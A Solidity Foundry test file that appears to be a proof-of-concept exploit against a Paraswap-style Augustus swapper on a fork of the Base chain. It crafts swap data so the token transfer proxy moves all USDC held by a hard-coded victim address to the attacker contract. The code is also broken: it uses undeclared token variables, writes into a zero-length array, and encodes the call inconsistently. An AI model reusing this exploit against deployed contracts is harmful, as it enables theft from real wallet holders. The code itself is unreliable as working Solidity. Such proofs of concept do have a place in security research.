// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface ITokenTransferProxy {
    function transferFrom(
        address token,
        address from,
        address to,
        uint256 amount
    ) external;
}

interface IV3router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IAugustusSwapper {
    function simpleSwap(Utils.SimpleData memory data) external payable returns (uint256 receivedAmount);
}

library Utils {
    struct SimpleData {
        address fromToken;
        address toToken;
        uint256 fromAmount;
        uint256 toAmount;
        uint256 expectedAmount;
        address[] callees;
        bytes exchangeData;
        uint256[] startIndexes;
        uint256[] values;
        address payable beneficiary;
        address payable partner;
        uint256 feePercent;
        bytes permit;
        uint256 deadline;
        bytes16 uuid;
    }
}

contract vaulttTest is Test {
    IAugustusSwapper AugustusSwapper = IAugustusSwapper(0x59C7C832e96D2568bea6db468C1aAdcbbDa08A52);
    ITokenTransferProxy routerproxy = ITokenTransferProxy(0x93aAAe79a53759cD164340E4C8766E4Db5331cD7);
    address constant vic = 0x249c90E06941F22b5746fE235126df75870738BC;
    IERC20 srcToken = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 dstToken = IERC20(0x940181a94A35A4569E4529A3CDfB74e38FD98631);
    IV3router v3router = IV3router(0xaeE2b8d4A154e36f479dAeCe3FB3e6c3c03d396E);

    function setUp() public {
        vm.createSelectFork("https://developer-access-mainnet.base.org", 20295659);
        deal(address(usdc), address(this), 20 ether);
    }

    function testExploit() external {
        attack();
    }

    function attack() internal {
        // uint256 amountIn = 10 ether;
        IERC20(usdc).approve(address(routerproxy), IERC20(usdc).balanceOf(address(this)));
        // IERC20(usdc).approve(address(v3router), amountIn);

        // Fixed declarations of callees, startIndexes, and values arrays
        address[] memory callees = new address[](0);
        callees[0] = address(AugustusSwapper);
        // callees[1] = address(AugustusSwapper);
        
        uint256[] memory startIndexes = new uint256[](2);
        startIndexes[0] = 0;
        startIndexes[1] = 1;
        // startIndexes[2] = 2;

        uint256[] memory values = new uint256[](2);
        values[0] = 0;
        values[1] = 0;

        address fromToken = address(usdc);
        address toToken = address(euro);
        uint256 fromAmount = 10 ether;
        uint256 toAmount = 10 ether; // Use ether for consistency
        uint256 expectedAmount = 9 ether; // Use ether for consistency
        address payable partner = payable(address(this));
        uint256 feePercent = 1;
        bytes memory permit = "";
        address payable beneficiary = payable(address(this));
        uint256 deadline = block.timestamp + 1 hours;

        bytes memory transfData = abi.encodeWithSignature(
            "delegateFrom(address,address,address,uint256)", 
            usdc, 
            vic, 
            address(this), 
            usdc.balanceOf(vic)
        );

        bytes memory exchangeData = abi.encodeWithSelector(IV3router.exactInputSingle.selector, transfData);

        // Corrected the SimpleData declaration
        Utils.SimpleData memory data = Utils.SimpleData({
            callees: callees,
            exchangeData: exchangeData,
            startIndexes: startIndexes,
            values: values,
            fromToken: fromToken,
            toToken: toToken,
            fromAmount: fromAmount,
            toAmount: toAmount,
            expectedAmount: expectedAmount,
            partner: partner,
            feePercent: feePercent,
            permit: permit,
            beneficiary: beneficiary,
            deadline: deadline,
            uuid: 0
        });

        // Fixed the IV3router.ExactInputSingleParams initialization
        // IV3router.ExactInputSingleParams memory params =
        //     IV3router.ExactInputSingleParams({
        //         tokenIn: address(usdc),
        //         tokenOut: address(euro),
        //         fee: 3000, // 0.3% fee
        //         recipient: address(this),
        //         deadline: block.timestamp + 15,
        //         amountIn: amountIn,
        //         amountOutMinimum: 0,
        //         sqrtPriceLimitX96: 0
        //     });

        // // Correct encoding of the selector
        // bytes memory routerData = abi.encodeWithSelector(
        //     IV3router.exactInputSingle.selector,
        //     params
        // );

        // Call the AugustusSwapper
        IAugustusSwapper(AugustusSwapper).simpleSwap(data);
    }

    function delegateFrom(address _token, address _from, address to, uint256 _amount) external {
        (bool success, bytes memory returnData) = address(routerproxy).delegatecall(
            abi.encodeWithSignature(
                "transferFrom(address,address,address,uint256)", 
                _token, 
                _from, 
                to, 
                _amount
            )
        );

        require(success, "delegatecall failed");
    }
}